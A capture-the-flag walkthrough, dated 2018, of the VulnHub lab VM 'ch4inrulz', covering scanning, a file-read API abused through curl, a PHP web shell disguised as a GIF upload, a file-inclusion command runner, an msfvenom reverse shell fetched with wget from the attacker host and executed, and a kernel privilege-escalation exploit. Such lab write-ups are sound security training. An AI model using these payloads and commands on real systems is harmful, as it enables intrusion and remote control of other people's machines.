@@ -1,0 +1,286 @@
+
+
+ch4inrulz: 1.0.1 Walkthrough
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+2 Sep 2018
+
+
+
+8 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of ch4inrulz: 1.0.1, a boot2root VM created by askar, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+Frank has a small website, and he is a smart developer with a normal security background; he always loves to follow patterns. Your goal is to discover any critical vulnerabilities and gain access to the system. Ultimately, you need to gain root access to capture the root flag.
+Information Gathering
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.20.130
+...
+PORT     STATE SERVICE REASON         VERSION
+21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.3.5
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.20.128
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 2.3.5 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 d4:f8:c1:55:92:75:93:f7:7b:65:dd:2b:94:e8:bb:47 (DSA)
+|   2048 3d:24:ea:4f:a2:2a:ca:63:b7:f4:27:0f:d9:17:03:22 (RSA)
+|_  256 e2:54:a7:c7:ef:aa:8c:15:61:20:bd:aa:72:c0:17:88 (ECDSA)
+80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: FRANK's Website | Under development
+8011/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 00:50:56:3E:59:38 (VMware)
+
+nmap finds 21/tcp, 22/tcp, 80/tcp, and 8011/tcp open. Since FTP allows anonymous login, letâs check that first.
+
+Hmm. Nothing interesting to explore.
+Frankâs Website
+OK. Frankâs website is up next.
+
+I must say the design looks good. Clean and simple.
+Now, letâs use dirb to bust some directories. 80/tcp goes first.
+# dirb http://192.168.20.130 /usr/share/dirb/wordlists/big.txt -N 404 -r
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Sep  2 08:12:01 2018
+URL_BASE: http://192.168.20.130/
+WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt
+OPTION: Ignoring NOT_FOUND code -&gt; 404
+OPTION: Not Recursive
+
+-----------------
+
+GENERATED WORDS: 20458                                                         
+
+---- Scanning URL: http://192.168.20.130/ ----
++ http://192.168.20.130/LICENSE (CODE:200|SIZE:1093)                                                
++ http://192.168.20.130/cgi-bin/ (CODE:403|SIZE:290)                                                
+==&gt; DIRECTORY: http://192.168.20.130/css/                                                           
++ http://192.168.20.130/development (CODE:401|SIZE:481)                                             
+==&gt; DIRECTORY: http://192.168.20.130/img/                                                           
++ http://192.168.20.130/index (CODE:200|SIZE:334)                                                   
+==&gt; DIRECTORY: http://192.168.20.130/js/                                                            
++ http://192.168.20.130/robots (CODE:200|SIZE:21)                                                   
++ http://192.168.20.130/robots.txt (CODE:200|SIZE:21)                                               
++ http://192.168.20.130/server-status (CODE:403|SIZE:295)                                           
+==&gt; DIRECTORY: http://192.168.20.130/vendor/                                                        
+
+-----------------
+END_TIME: Sun Sep  2 08:12:10 2018
+DOWNLOADED: 20458 - FOUND: 7
+
+/development/ needs credential.
+
+8011/tcp is next.
+# dirb http://192.168.20.130:8011 /usr/share/dirb/wordlists/big.txt -N 404 -r
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Sep  2 08:12:26 2018
+URL_BASE: http://192.168.20.130:8011/
+WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt
+OPTION: Ignoring NOT_FOUND code -&gt; 404
+OPTION: Not Recursive
+
+-----------------
+
+GENERATED WORDS: 20458                                                         
+
+---- Scanning URL: http://192.168.20.130:8011/ ----
+==&gt; DIRECTORY: http://192.168.20.130:8011/api/                                                      
++ http://192.168.20.130:8011/server-status (CODE:403|SIZE:297)                                      
+
+-----------------
+END_TIME: Sun Sep  2 08:12:34 2018
+DOWNLOADED: 20458 - FOUND: 1
+
+/api/ has some interesting information.
+
+In particular, /api/files_api.php exists.
+
+I found out that /api/files_api.php is able to read files through POST requests. To that end, I wrote a script to cat files which I have read permissions.
+files.sh
+#!/bin/bash
+
+HOST=192.168.20.130
+API=api/files_api.php
+PORT=8011
+FILE=$1
+
+curl -s -d "file=$FILE" "http://$HOST:$PORT/$API" \
+| sed -e '6,$!d' -e '$d'
+
+Letâs read /etc/passwd.
+
+Not bad. Thereâs a frank account and www-dataâs home directory is at /var/www.
+Now, letâs read /var/www/development/.htaccess.
+
+.htpasswd is at somewhere else. Letâs read that as well.
+
+Iâm going to save .htpasswd and send it to John the Ripper for offline cracking.
+
+Time to access /development/ and see what we got there.
+
+No surprise, the âuploader toolâ is at /development/uploader/.
+
+Hereâs what I observed about the âuploader toolâ:
+
+Checks image file extension for JPG, JPEG, PNG, and GIF.
+Checks the associated image MIME type
+
+I crafted the following file to bypass the checks and to upload.
+# cat cmd.php.gif
+GIF89a;
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+
+OK. I manage to upload the file. But whereâs the upload path?
+
+Iâve tried the following paths with no success:
+
+/uploader/upload
+/uploader/uploads
+/uploader/myupload
+/uploader/myuploads
+/uploader/my-upload
+/uploader/my-uploads
+/uploader/my_upload
+/uploader/my_uploads
+
+Then I had an epiphany. What if the word âmyâ refers to Frank? I tried all the permutations of âFrankâ until I hit the one seen here.
+
+Sneaky bastard, this Frank.
+Low-Privilege Shell
+This is where I hit another road block. Somehow, the web server is refusing to load PHP at /development/uploader.
+
+No luck even with curl.
+# curl -u 'frank:frank!!!' http://192.168.20.130/development/uploader/FRANKuploads/cmd.php.gif?cmd=id
+GIF89a;
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+
+Wait a minute. Back up. Whenâs the last time I saw PHP loaded? At 8011/tcp with /api/files_api.php!
+Perhaps I can re-purpose cat.sh to something like this.
+cmd.sh
+#!/bin/bash
+
+HOST=192.168.20.130
+API=api/files_api.php
+PORT=8011
+FILE=/var/www/development/uploader/FRANKuploads/cmd.php.gif
+CMD=$(echo -n "$1" \
+      | xxd -p \
+      | tr -d '\n' \
+      | sed -r 's/(..)/%\1/g')
+
+curl -s -d "file=$FILE" "http://$HOST:$PORT/$API/?cmd=$CMD" \
+| sed -e '6,$!d' -e '$d' \
+| sed 1d
+
+Letâs give it a shot.
+# ./cmd.sh id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# ./cmd.sh "uname -a"
+Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
+
+# ./cmd.sh "lsb_release -a"
+Distributor ID:	Ubuntu
+Description:	Ubuntu maverick (development branch)
+Release:	10.10
+Codename:	maverick
+
+Too bad the VM has the traditional nc or BSD nc. Otherwise, we could have gotten a reverse shell with nc. Nonetheless, we can transfer a reverse shell over since wget is available.
+On the attacking machine, generate a reverse shell with msfvenom.
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=1234 -f elf -o rev
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: rev
+
+Next, host the reverse shell with Pythonâs SimpleHTTPServer module.
+# python -m SimpleHTTPServer 80
+
+Using cmd.sh, run this command.
+# ./cmd.sh "wget -O /tmp/rev 192.168.20.128/rev"
+
+
+The transfer is successful. Next, make /tmp/rev executable.
+# ./cmd.sh "chmod +x /tmp/rev"
+# ./cmd.sh "ls -l /tmp/rev"
+-rwxr-xr-x 1 www-data www-data 194 Sep  2 10:06 /tmp/rev
+
+Lastly, before we run the reverse shell, we need to set up our nc listener to catch it on the attacking machine.
+# ./cmd.sh /tmp/rev
+
+
+Before I forget, hereâs the user flag at /home/frank/user.txt.
+
+Privilege Escalation
+If you have noticed the kernel version, you realized how old the kernel is. What does that mean for us? Local privilege escalation exploit! Letâs use searchsploit to find a relevant exploit.
+
+Iâve chosen the âRDS Protocolâ local privilege escalation exploit. Itâs relevant to the kernel and seems independent of the distribution. More importantly, itâs a simple and easy-to-understand exploit.
+Now, how do I transfer the exploit source code over? Through wget and Pythonâs SimpleHTTPServer module of course. Iâm also fortunate enough to have gcc available in the VM.
+Letâs do this \o/
+
+What a bummer! 
+
+Nothing is going to stop me 
+
+root at last!
+
+Getting the root flag is one command away.
+
+
+Afterthought
+In the immortal words of Offensive Security, âTry Harderâ.
+
